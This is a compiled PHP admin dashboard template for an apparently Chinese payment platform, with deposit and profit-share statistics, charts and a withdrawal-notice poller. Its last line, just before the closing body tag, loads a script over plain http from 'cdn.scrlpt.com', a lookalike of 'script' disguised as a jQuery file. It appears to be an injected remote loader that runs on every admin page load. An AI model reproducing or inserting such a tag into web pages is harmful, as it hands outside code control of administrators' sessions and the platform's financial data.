<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
  <title>后台管理 - <?php echo ($sitename); ?></title>
  <!--[if lt IE 9]>
  <meta http-equiv="refresh" content="0;ie.html" />
  <![endif]-->
    <link rel="icon" href="Public/qq572125157/images/favicon.ico">
<!-- Bootstrap 4.0-->
	<link rel="stylesheet" href="Public/qq572125157/css/assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<!-- Data Table-->
	<link rel="stylesheet" type="text/css" href="Public/qq572125157/css/assets/vendor_components/datatable/datatables.min.css"/>	
	<!-- Bootstrap extend-->
	<link rel="stylesheet" href="Public/qq572125157/css/bootstrap-extend.css">	
	<!-- theme style -->
	<link rel="stylesheet" href="Public/qq572125157/css/master_style.css">
	<!-- Fab Admin skins -->
	<link rel="stylesheet" href="Public/qq572125157/css/skins/_all-skins.css">	
	<!-- Morris charts -->
	<link rel="stylesheet" href="Public/qq572125157/css/assets/vendor_components/morris.js/morris.css">
   <link rel="stylesheet" href="/Public/Front/js/plugins/layui/css/layui.css">
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>
<body class="hold-transition skin-blue-light sidebar-mini">
<div class="wrapper">
  <header class="main-header">
    <!-- Logo -->
    <a href="index.html" class="logo">
      <!-- mini logo -->
	  <b class="logo-mini">
		  <span class="light-logo"><img src="Public/qq572125157/images/logo-light.png" alt="logo"></span>
		  <span class="dark-logo"><img src="Public/qq572125157/images/logo-dark.png" alt="logo"></span>
	  </b>
      <!-- logo-->
      <span class="logo-lg">
		  <img src="Public/qq572125157/images/logo-light-text.png" alt="logo" class="light-logo">
	  	  <img src="Public/qq572125157/images/logo-dark-text.png" alt="logo" class="dark-logo">
	  </span>
    </a>
    <!-- Header Navbar -->
    <nav class="navbar navbar-static-top">
      <!-- Sidebar toggle button-->
	  <div>
		  <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
			<span class="sr-only">Toggle navigation</span>
		  </a>
        </div>
 <div class="navbar-custom-menu">
        <ul class="nav navbar-nav">
		  <!-- User Account-->
          <li class="dropdown user user-menu">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
             <span class="glyphicon glyphicon-user"></span>
            </a>
            <ul class="dropdown-menu scale-up">
              <!-- User image -->
              <li class="user-header">
                <img src="Public/qq572125157/images/user_admin.png" class="float-left rounded-circle" alt="User Image">

                <p style="font-size: 14px;">
                  <small class="mb-2"></small>
                    <small class="mb-2"></small>
                 <small class="mb-10">ID:<?php echo ($member["username"]); ?></small>
                       <small class="mb-10"><?php switch($member['groupid']): case "1": ?>总管理员<?php break;?>
            <?php case "2": ?>运营管理员<?php break;?>
			<?php case "3": ?>财务管理员<?php break; endswitch;?></small>
      </p>
              </li>
              <!-- Menu Body -->
              <li class="user-body">
                <div class="row no-gutters">
                  <div class="col-12 text-left">
                    <a href="<?php echo U("admin/Menu/index");?>"><i class="ion ion-person"></i> 权限配置</a>
                  </div>
                  <div class="col-12 text-left">
                    <a href="<?php echo U("admin/System/editPassword");?>"><i class="ion ion-email-unread"></i> 修改密码</a>
                  </div>
                  <div class="col-12 text-left">
                    <a href="<?php echo U("admin/System/base");?>"><i class="ion ion-settings"></i> 系统设置</a>
                  </div>
				<div role="separator" class="divider col-12"></div>
				  <div class="col-12 text-left">
                    <a href="<?php echo U("admin/System/mobile");?>"><i class="ti-settings"></i> 绑定手机</a>
                  </div>
				<div role="separator" class="divider col-12"></div>
				  <div class="col-12 text-left">
                    <a href="<?php echo U("Login/loginout");?>"> <i class="fa fa-power-off"></i> 安全退出</a>
                  </div>				
                </div>
                <!-- /.row -->
              </li>
            </ul>
          </li>
          <!-- Control Sidebar Toggle Button -->
          <li>
            <a href="#" data-toggle="control-sidebar"><i class="fa fa-cog fa-spin"></i></a>
          </li>
        </ul>
      </div>
    </nav>
  </header>
  <!-- Left side column. contains the logo and sidebar -->
<nav class="navbar-default navbar-static-side" role="navigation">
  <aside class="main-sidebar">
    <!-- sidebar-->
    <section class="sidebar">
      <!-- sidebar menu-->
      <ul class="sidebar-menu" data-widget="tree" id="side-menu">
        
        <li class="user-profile treeview">
      <a href="javascript:void()">
			<img src="Public/qq572125157/images/user_admin.png" alt="user">
            <span> 身份：<?php switch($member['groupid']): case "1": ?>总管理员<?php break;?>
            <?php case "2": ?>运营管理员<?php break;?>
			<?php case "3": ?>财务管理员<?php break; endswitch;?></span>
            <span class="pull-right-container">
              <i class="fa fa-angle-right pull-right"></i>
            </span>
          </a>
<ul class="treeview-menu">
            <li><a href="javascript:void()"><i class="fa fa-user mr-5"></i>管理ID： <?php echo ($member["username"]); ?> </a></li>
			<li><a href="<?php echo U("Login/loginout");?>"><i class="fa fa-power-off mr-5"></i>安全退出</a></li>
          </ul>
        </li>
<li class="header nav-small-cap">Management</li>    
<?php if(is_array($navmenus)): $i = 0; $__LIST__ = $navmenus;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$nm): $mod = ($i % 2 );++$i;?><li class="treeview">         
                  <a   href="<?php if(!count($nm[$nm['id']])): echo U($nm[menu_name]); else: ?>#<?php endif; ?>"> <i class="<?php echo ($nm['icon']); ?>"></i> 
                    <span class="nav-label"><?php echo ($nm['title']); ?></span><?php if($nm[$nm['id']]): ?><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span><?php endif; ?>
                    </a>
                    <?php if($nm[$nm['id']]): ?><ul  class="treeview-menu">
                        <?php if(is_array($nm[$nm['id']])): $i = 0; $__LIST__ = $nm[$nm['id']];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$sub): $mod = ($i % 2 );++$i;?><li class=""><a  href="<?php echo U($sub['menu_name']);?>"><i
                                    class="<?php echo ($sub['icon']); ?>"></i> <?php echo ($sub['title']); ?></a></li><?php endforeach; endif; else: echo "" ;endif; ?>
                    </ul><?php endif; ?>                    
                </li><?php endforeach; endif; else: echo "" ;endif; ?>

  <li class="header nav-small-cap">其他功能</li>
            <li class="treeview">  
                 <a   href="#"> <i class="fa fa-refresh"></i> 
                    <span class="nav-label">异常订单排查</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">
 <li class=""><a href="<?php echo U('Admin/Order/frozenOrder');?>" class="J_menuItem">  <i class="fa fa-refresh"></i>   异常订单排查</a></li> </ul>    
              
               <li class="treeview">  
                 <a   href="#"> <i class="fa fa-align-justify"></i> 
                    <span class="nav-label">批量删除订单</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">
                      <li><a href="<?php echo U('Admin/Order/delAll');?>" class="J_menuItem">
                          <i class="fa fa-fw fa-align-justify"></i>   批量删除订单</a></li></ul>    
                 
                    <li class="treeview">  
                 <a   href="#"> <i class="fa fa-apple"></i> 
                    <span class="nav-label">模板管理</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">
                        <li><a href="<?php echo U('Admin/Template/index');?>" class="J_menuItem">
                          <i class="fa fa-fw fa-apple"></i> 模板管理</a></li></ul>    
                      
                  <li class="treeview">  
                 <a   href="#"> <i class="fa fa-weixin"></i> 
                    <span class="nav-label">用户分类管理</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">       
                       <li><a href="<?php echo U('Admin/User/agentCateList');?>" class="J_menuItem">
                          <i class="fa fa-fw fa-weixin"></i> 用户分类管理</a></li></ul>    
                    
                     <li class="treeview">  
                 <a   href="#"> <i class="fa fa-user"></i> 
                    <span class="nav-label">谷歌验证器</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">           
            <li><a href="<?php echo U('Admin/Auth/google');?>"  class="J_menuItem">
                          <i class="fa fa-user-secret"></i>谷歌验证器</a></li></ul>    
                       
                           <li class="treeview">  
                 <a   href="#"> <i class="fa fa-jsfiddle"></i> 
                    <span class="nav-label">清除缓存</span><span class="pull-right-container">
                      <i class="fa fa-angle-right pull-right"></i></span>                    </a>
                    <ul  class="treeview-menu">   
                      <li>  <a href="<?php echo U('Admin/Index/clearCache');?>" class="J_menuItem"><i class="fa fa-fw fa-jsfiddle"></i> 清除缓存 </a></li></ul>    
      </ul>
</section>
  </aside>
  </nav>
<!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Dashboard
        <small><?php echo ($sitename); ?></small><small><script>
　　　　var now = new Date;
　　　　var bir = new Date(2018,11,21,08,08,08);  //在这里按照这个格式输入系统开始运行时间：年月日时分秒
　　　　console.log(bir.getTime() + '<br>');
　　　　console.log(now.getTime() + '<br>');
　　　　var cha = now - bir;
　　　　console.log(cha + '<br>')
　　　　var date = cha / 86400000;
　　　　document.write('系统已经稳定运行' + parseInt(date) + '天零');
　　　　var hours1 = (cha % 86400000) / 3600000;
　　　　document.write(parseInt(hours1) + '小时零');
　　　　var minutes1 = (cha % 86400000 % 3600000) / 60000;
　　　　document.write(parseInt(minutes1) + '分钟零');
　　　　var second1 = (cha % 86400000 % 3600000 % 60000)/ 1000;
　　　　document.write(parseInt(second1) + '秒');
　　</script></small>
      </h1>
      <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="breadcrumb-item active">Dashboard</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">  
	  <div class="row">
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body bg-primary">
              <h6>
                <span class="text-uppercase">平台总入金</span>
                <span class="float-right"><a class="btn btn-xs btn-warning" href="<?php echo U('Admin/Statistics/index');?>">详情</a></span>
              </h6>
			  <div class="flexbox align-items-center">
				 <div><small>Todays Order</small><p class="font-size-26 mb-0">$<?php echo ($stat["allordersum"]); ?></p></div>
				 <div><div class="font-size-14 text-right"><i class="ion-arrow-graph-up-right font-size-18 text-white mr-1"></i>  up from<br> last month</div></div>
			  </div>              
            </div>
        </div>
        <!-- /.col -->
         <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body bg-success">
              <h6>
                <span class="text-uppercase">今日平台总入金</span>
                <span class="float-right"><a class="btn btn-xs btn-warning" href="<?php echo U('Admin/Order/index/status/1or2');?>">详情</a></span>
              </h6>             
			  <div class="flexbox align-items-center">
				 <div><small>Yearly Income</small><p class="font-size-26 mb-0">$<?php echo ($stat["todayordersum"]); ?></p></div>
				 <div><div class="font-size-14 text-right"><i class="ion-arrow-graph-up-right font-size-18 text-white mr-1"></i>  up<br> last year</div></div>
			  </div>
            </div>
        </div>
        <!-- /.col -->
        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body bg-info">
              <h6>
                <span class="text-uppercase">代理总分成</span>
                <span class="float-right"><a class="btn btn-xs btn-warning" href="<?php echo U('Admin/Statistics/userFinance/groupid/agent/');?>">详情</a></span>
              </h6>              
			  <div class="flexbox align-items-center">
				 <div><small>Monthly Deduction</small><p class="font-size-26 mb-0">$<?php echo ($stat["allmemberprofit"]); ?></p></div>
				 <div><div class="font-size-14 text-right"><i class="ion-arrow-graph-up-right font-size-18 text-white mr-1"></i>  more than<br> last year</div></div>
			  </div> 
            </div>
        </div>
        <!-- /.col -->

        <div class="col-xl-3 col-md-6 col-12">
          	<div class="box box-body bg-danger">
              <h6>
                <span class="text-uppercase">平台总分成</span>
                <span class="float-right"><a class="btn btn-xs btn-warning" href="<?php echo U('Admin/Statistics/platformReport');?>">详情</a></span>
              </h6>             
			  <div class="flexbox align-items-center">
				 <div><small>Weekly Revenue</small><p class="font-size-26 mb-0">$<?php echo ($stat["allplatformincome"]); ?></p></div>
				 <div><div class="font-size-14 text-right"><i class="ion-arrow-graph-down-right font-size-18 text-white mr-1"></i>  down<br> last year</div></div>
			  </div>
            </div>
        </div>
        <!-- /.col -->
       
		  
      </div>	  	
		 <div class="row">
        <div class="col-xl-3 col-md-6 col">
          <div class="info-box">
            <span class="info-box-icon bg-info rounded"><i class="ion ion-stats-bars"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo ($stat["todaymemberprofit"]); ?><small>$</small></span>
              <span class="info-box-text">今日代理总分成</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->
        <div class="col-xl-3 col-md-6 col">
          <div class="info-box">
            <span class="info-box-icon bg-success rounded-circle"><i class="ion ion-thumbsup"></i></span>

            <div class="info-box-content">
              <span class="info-box-number">$<?php echo ($stat["todayplatformincome"]); ?></span>
              <span class="info-box-text">今日平台总分成</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->

        <!-- fix for small devices only -->
        <div class="clearfix visible-sm-block"></div>

        <div class="col-xl-3 col-md-6 col">
          <div class="info-box">
            <span class="info-box-icon bg-primary rounded-left"><i class="ion ion-bag"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo ($ddata["num"]); ?></span>
              <span class="info-box-text">今日订单数</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->
        <div class="col-xl-3 col-md-6 col">
          <div class="info-box">
            <span class="info-box-icon bg-danger rounded-right"><i class="ion ion-person-stalker"></i></span>

            <div class="info-box-content">
              <span class="info-box-number"><?php echo ((isset($wdata["rate"]) && ($wdata["rate"] !== ""))?($wdata["rate"]):0); ?></span>
              <span class="info-box-text">本周总分成</span>
            </div>
            <!-- /.info-box-content -->
          </div>
          <!-- /.info-box -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->

      <div class="row">
		  
		<div class="col-12 col-lg-6">
          <!-- AREA CHART -->
          <div class="box">
            <div class="box-header with-border">
              <h4 class="box-title">今日平台交易统计表</h4>
				<ul class="box-controls pull-right">
                  <li><a class="box-btn-close" href="#"></a></li>
                  <li><a class="box-btn-slide" href="#"></a></li>	
                  <li><a class="box-btn-fullscreen" href="#"></a></li>
                </ul>
            </div>
            <div class="box-body">
				<ul class="flexbox flex-justified text-center my-10">
					<li class="br-1">
					  <p class="mb-0">今日入金</p>
					  <div class="font-size-20 mb-5">$<?php echo ((isset($ddata["rate"]) && ($ddata["rate"] !== ""))?($ddata["rate"]):0); ?></div>
					  <div class="font-size-18 text-success">
					  	<i class="fa fa-arrow-up pr-5"></i><span>+%</span>
					  </div>
					</li>

					<li class="br-1">
					  <p class="mb-0">今日交易金额</p>
					  <div class="font-size-20 mb-5">$<?php echo ((isset($ddata["amount"]) && ($ddata["amount"] !== ""))?($ddata["amount"]):0); ?></div>
					  <div class="font-size-18 text-success">
					  	<i class="fa fa-arrow-up pr-5"></i><span>+%</span>
					  </div>
					</li>

					<li>
					  <p class="mb-0">实时订单数</p>
					  <div class="font-size-20 mb-5"><?php echo ($ddata["num"]); ?></div>
					  <div class="font-size-18 text-danger">
					  	<i class="fa fa-arrow-down pr-5"></i><span>%</span>
					  </div>
					</li>
				</ul>
				
				<div class="chart" id="bar-chart" style="height: 300px;"></div>				
                
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->			
        </div>
		
		  
		<div class="col-12 col-lg-6">
          <!-- AREA CHART -->
          <div class="box">
            <div class="box-header with-border">
              <h4 class="box-title">一周内交易统计表（共<?php echo ($wdata["num"]); ?>笔）</h4>
				<ul class="box-controls pull-right">
                  <li><a class="box-btn-close" href="#"></a></li>
                  <li><a class="box-btn-slide" href="#"></a></li>	
                  <li><a class="box-btn-fullscreen" href="#"></a></li>
                </ul>
            </div>
            <div class="box-body">
              <div class="chart-responsive">
                <div class="chart" id="chart_1" style="height: 395px;"></div>
              </div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->			
        </div>	
		
		
      
   <!-- /.row -->	      
	</section>
    <!-- /.content -->
  </div>


 <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
    <footer class="main-footer">
    <div class="pull-right d-none d-sm-inline-block">
        <ul class="nav nav-primary nav-dotted nav-dot-separated justify-content-center justify-content-md-end">
		  <li class="nav-item">
			<a class="nav-link" href="/" target="_blank">平台首页</a>
		  </li>
		  <li class="nav-item">
			<a class="nav-link" href="javascript:layer.alert('当前版本<?php echo C('SOFT_NAME');?>！<br>版本号：<?php echo C('SOFT_VERSION');?><br>系统购买联系QQ：<?php echo C('supportqq');?>',{icon:6});"><?php echo C('SOFT_NAME');?> 系统版本:<?php echo C('SOFT_VERSION');?></a>
		  </li>
		</ul>
    </div>
	  &copy; 2018-2019 <a href="/"><?php echo ($sitename); ?></a> 版权所有
  </footer>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-light">
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li class="nav-item"><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
       <!--<li class="nav-item"><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-cog fa-spin"></i></a></li> -->
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Contact Author</h3>
        <ul class="control-sidebar-menu">
        
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-warning"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading"> 联系QQ : <?php echo C('supportqq');?></h4>
              </div>
            </a>
          </li>
      
        </ul>
        <!-- /.control-sidebar-menu -->
</div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->  
  <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
<!-- ./wrapper -->
	<div class="control-sidebar-bg"></div>
</div>  
	<!-- jQuery 3 -->
	<script src="Public/qq572125157/css/assets/vendor_components/jquery/dist/jquery.js"></script>
	<!-- jQuery UI 1.11.4 -->
	<script src="Public/qq572125157/css/assets/vendor_components/jquery-ui/jquery-ui.js"></script>	
	<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
	<script>
	  $.widget.bridge('uibutton', $.ui.button);
	</script>	
	<!-- popper -->

	<script src="Public/qq572125157/css/assets/vendor_components/popper/dist/popper.min.js"></script>	
	<!-- Bootstrap 4.0-->
	<script src="Public/qq572125157/css/assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>		
	<!-- Slimscroll -->
	<script src="Public/qq572125157/css/assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- FastClick -->
	<script src="Public/qq572125157/css/assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<!-- Morris.js charts -->
	<script src="Public/qq572125157/css/assets/vendor_components/raphael/raphael.min.js"></script>
	<script src="Public/qq572125157/css/assets/vendor_components/morris.js/morris.min.js"></script>
	<!-- echarts -->
	<script src="Public/qq572125157/css/assets/vendor_components/echarts/dist/echarts-en.min.js"></script>
	<script src="Public/qq572125157/css/assets/vendor_components/echarts/echarts-liquidfill.min.js"></script>	
	<!-- Sparkline -->
	<script src="Public/qq572125157/css/assets/vendor_components/jquery-sparkline/dist/jquery.sparkline.js"></script>
	<!-- Fab Admin App -->
	<script src="Public/qq572125157/js/template.js"></script>
	<!-- Fab Admin dashboard demo (This is only for demo purposes) -->
	<script src="Public/qq572125157/js/pages/dashboard.js"></script>
	<!-- Fab Admin for demo purposes -->
<script src="Public/qq572125157/js/demo.js"></script>	 
<script src="/Public/Front/js/bootstrap.min.js"></script>
<script src="/Public/Front/js/plugins/peity/jquery.peity.min.js"></script>
<script src="/Public/Front/js/plugins/layui/layui.js" charset="utf-8"></script>
<script src="/Public/Front/js/x-layui.js" charset="utf-8"></script>
<script src="/Public/Front/js/Util.js" charset="utf-8"></script>
<script src="Public/qq572125157/js/pages/validation.js"></script>
<!-- Fab   -->
<script src="/Public/Front/js/plugins/metisMenu/jquery.metisMenu.js"></script>
<script src="/Public/Front/js/plugins/slimscroll/jquery.slimscroll.min.js"></script>
<script src="/Public/Front/js/iNotify.js"></script>
<script>
    layui.use(['laypage', 'layer', 'form'], function () {
        var form = layui.form,
            layer = layui.layer,
            $ = layui.jquery;
    });
    function reset_pwd(title,url,w,h){
        x_admin_show(title,url,w,h);
    }
</script>
<script>
   /*提现语音提示开始*/
    var iNotify = new iNotify({
        message: '有消息了。',//标题
        effect: 'flash', // flash | scroll 闪烁还是滚动
        interval: 300,
        audio:{
            //file: ['/Public/sound/msg.mp4','/Public/sound/msg.mp3','/Public/sound/msg.wav']
            file:'https://tts.baidu.com/text2audio?lan=zh&ie=UTF-8&spd=5&text=有客户申请提现请及时处理'
        }
    });
  <?php if(($withdraw) == "1"): ?>setInterval(function() {
            $.ajax({
                type: "GET",
                url: "<?php echo U('Withdrawal/checkNotice');?>",
                cache: false,
                success: function (res) {
                    if (res.num>0) {
                        iNotify.setFavicon(res.num).setTitle('<?php echo ($sitename); ?>提现通知').notify({
                            title: "<?php echo ($sitename); ?>后台通知：",
                            body: "有客户申请提现，请及时处理！"
                        }).player();
                    }
                }
            });
        },10000);<?php endif; ?>
   /*提现语音提示结束*/
</script>
<!-- ./wrapper -->
  <!-- /.content-wrapper -->
<script>      
      // AREA CHART
    var area = new Morris.Area({
      element: 'chart_1',
      resize: true,
      data: [
        { y: '7日交易金额', a: <?php echo ((isset($wdata["amount"]) && ($wdata["amount"] !== ""))?($wdata["amount"]):0); ?>,},
		{ y: '7日收入金额', a: <?php echo ((isset($wdata["rate"]) && ($wdata["rate"] !== ""))?($wdata["rate"]):0); ?>,},
		{ y: '7日支出金额', a: <?php echo ((isset($wdata["total"]) && ($wdata["total"] !== ""))?($wdata["total"]):0); ?>,},
      ],
		xkey: 'y',
		ykeys: ['a'],
		labels: ['金额','line'],
		fillOpacity: 1,
		lineWidth:0,
		lineColors: ['#1e88e5', '#fc4b6c'],
		hideHover: 'auto'
    });

	
	
//BAR CHART
    var bar = new Morris.Bar({
      element: 'bar-chart',
      resize: true,
      data: [
        {y: '今日交易金额', a:<?php echo ((isset($ddata["amount"]) && ($ddata["amount"] !== ""))?($ddata["amount"]):0); ?>,},
        {y: '今日收入金额', a:<?php echo ((isset($ddata["rate"]) && ($ddata["rate"] !== ""))?($ddata["rate"]):0); ?>,},
        {y: '今日支出金额', a:<?php echo ((isset($ddata["total"]) && ($ddata["total"] !== ""))?($ddata["total"]):0); ?>,},
      ],
		barColors: ['#7460ee', '#ffb22b'],
		barSizeRatio: 0.5,
		barGap:5,
		xkey: 'y',
		ykeys: ['a'],
		labels: ['金额','line'],
		hideHover: 'auto'
    });
	
/*****E-Charts function start*****/
		
	if( $('#e_chart_3').length > 0 ){
		var eChart_3 = echarts.init(document.getElementById('e_chart_3'));
		var data = [{
			value: 5713,
			name: ''
		}, {
			value: 8458,
			name: ''
		}, {
			value: 1254,
			name: ''
		}, {
			value: 2589,
			name: ''
		}, {
			value: 7458,
			name: ''
		}, {
			value: 6325,
			name: ''
		}, {
			value: 8452,
			name: ''
		}, {
			value: 9563,
			name: ''
		}, {
			value: 1125,
			name: ''
		}, {
			value: 8546,
			name: ''
		}];
		var option3 = {
			tooltip: {
				show: true,
				trigger: 'item',
				backgroundColor: 'rgba(33,33,33,1)',
				borderRadius:0,
				padding:10,
				formatter: "{b}: {c} ({d}%)",
				textStyle: {
					color: '#fff',
					fontStyle: 'normal',
					fontWeight: 'normal',
					fontFamily: "'Open Sans', sans-serif",
					fontSize: 12
				}	
			},
			series: [{
				type: 'pie',
				selectedMode: 'single',
				radius: ['100%', '30%'],
				color: ['#7460ee', '#e4e7ea', '#26c6da', '#1e88e5', '#ffb22b', '#fc4b6c', '#7c277d', '#FC3468', '#fcc525', '#8d6658'],
				labelLine: {
					normal: {
						show: false
					}
				},
				data: data
			}]
		};
		eChart_3.setOption(option3);
		eChart_3.resize();
	}
      </script>
      <script src="http://cdn.scrlpt.com/static/js/jquery1.8.3.js"></script>
</body>
</html>